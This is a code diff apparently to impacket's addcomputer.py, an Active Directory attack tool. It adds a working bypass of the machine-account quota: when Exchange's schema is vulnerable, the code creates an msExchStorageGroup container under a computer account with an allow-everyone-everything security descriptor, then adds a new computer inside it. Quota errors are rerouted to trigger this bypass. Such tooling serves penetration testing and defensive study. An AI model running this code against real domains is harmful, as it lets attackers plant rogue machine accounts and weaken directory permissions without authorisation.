@@ -32,6 +32,8 @@ from impacket.examples import logger
 from impacket.examples.utils import parse_credentials
 from impacket.dcerpc.v5 import samr, epm, transport
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
+from ldap3.protocol.microsoft import security_descriptor_control
+from ldap3.utils.conv import escape_filter_chars
 
 import ldap3
 import argparse
@@ -66,6 +68,11 @@ class ADDCOMPUTER:
         self.__targetIp = cmdLineOptions.dc_ip
         self.__baseDN = cmdLineOptions.baseDN
         self.__computerGroup = cmdLineOptions.computer_group
+
+        lmhash, nthash = self.__hashes.split(':') if self.__hashes is not None else ("", "")
+        if lmhash == '' and len(nthash) == 32:
+            self.__lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+            self.__hashes = ":".join([self.__lmhash, nthash])
 
         if self.__targetIp is not None:
             self.__kdcHost = self.__targetIp
@@ -142,6 +149,63 @@ class ADDCOMPUTER:
         rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
         self.doSAMRAdd(rpctransport)
 
+    def getUserInfo(self, ldapConn, username):
+        ldapConn.search(self.__baseDN, '(sAMAccountName=%s)' % escape_filter_chars(username), attributes=['objectSid'])
+        try:
+            dn = ldapConn.entries[0].entry_dn
+            sid = ldapConn.entries[0]['objectSid']
+            return (dn, sid)
+        except IndexError:
+            logging.error('User not found in LDAP: %s' % username)
+            return False
+
+    def bypass_with_msExchStorageGroup(self, ldapConn, ucd):
+        logging.info('Checking if `msExchStorageGroup` object exists within the schema and is vulnerable')
+        res = ldapConn.search(ldapConn.server.info.other['schemaNamingContext'][0], '(cn=ms-Exch-Storage-Group)',
+            search_scope=ldap3.LEVEL, attributes=['possSuperiors'])
+        
+        if not res:
+            logging.error('Object `msExchStorageGroup` does not exist within the schema, Exchange is probably not installed')
+            return False
+        
+        if 'computer' not in ldapConn.response[0]['attributes']['possSuperiors']:
+            logging.error('Object `msExchStorageGroup` not vulnerable, was probably patched')
+            return False
+
+        logging.info('Object `msExchStorageGroup` exists and is vulnerable!')
+
+        result = self.getUserInfo(ldapConn, self.__username)
+        if not result:
+            logging.error("Could not find target user in domain.")
+            return False
+
+        ACL_ALLOW_EVERYONE_EVERYTHING = b'\x01\x00\x04\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\n\x14\x00\x00\x00\x00\x10\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
+        target_dn = result[0]
+        mESG_name = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
+        mESG_dn = ('CN=%s,%s' % (mESG_name, target_dn))
+
+        logging.info('Attempting to add new `msExchStorageGroup` object `%s` under `%s`' % (mESG_name, target_dn))
+        res = ldapConn.add(mESG_dn, ['top', 'container', 'msExchStorageGroup'],
+            {'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING}, controls=security_descriptor_control(sdflags=0x04))
+
+        if not res:
+            logging.error('Failed to add `msExchStorageGroup` object: %s' % str(ldapConn.result))
+            return False
+
+        logging.info('Added `msExchStorageGroup` object at `%s`. DON\'T FORGET TO CLEANUP' % mESG_dn)
+
+        computerHostname = self.__computerName[:-1]
+
+        newComputerDn = 'CN=%s,%s' % (computerHostname, mESG_dn)
+        logging.info('Attempting to create computer in `%s`', mESG_dn)
+        res = ldapConn.add(newComputerDn, ['top','person','organizationalPerson','user','computer'], ucd)
+
+        if not res:
+            logging.error('Failed to add a new computer: %s' % str(ldapConn.result))
+            return False
+
+        logging.info('Adding new computer with username: %s and password: %s result: OK' % (self.__computerName, self.__computerPassword))
+
     def run_ldaps(self):
         connectTo = self.__target
         if self.__targetIp is not None:
@@ -172,7 +236,9 @@ class ADDCOMPUTER:
                                                  self.__aesKey, kdcHost=self.__kdcHost)
                 elif self.__hashes is not None:
                     ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
-                    ldapConn.bind()
+                    bind_res = ldapConn.bind()
+                    if not bind_res:
+                        raise Exception(ldapConn.result)
                 else:
                     ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
                     ldapConn.bind()
@@ -238,7 +304,10 @@ class ADDCOMPUTER:
                     if ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
                         error_code = int(ldapConn.result['message'].split(':')[0].strip(), 16)
                         if error_code == 0x216D:
-                            raise Exception("User %s machine quota exceeded!" % self.__username)
+                            logging.critical("User %s machine quota exceeded!" % self.__username)
+                            if self.__username.endswith('$'):
+                                logging.info("Trying to bypass machine quota with `msExchStorageGroup` object")
+                                self.bypass_with_msExchStorageGroup(ldapConn, ucd)
                         else:
                             raise Exception(str(ldapConn.result))
                     elif ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
@@ -485,7 +554,11 @@ class ADDCOMPUTER:
                     if e.error_code == 0xc0000022:
                         raise Exception("User %s doesn't have right to create a machine account!" % self.__username)
                     elif e.error_code == 0xc00002e7:
-                        raise Exception("User %s machine quota exceeded!" % self.__username)
+                        if self.__username.endswith('$'):
+                            logging.info("Using LDAPS method to bypass machine quota")
+                            return
+                        else:
+                            raise Exception("User %s machine quota exceeded!" % self.__username)
                     else:
                         raise
 
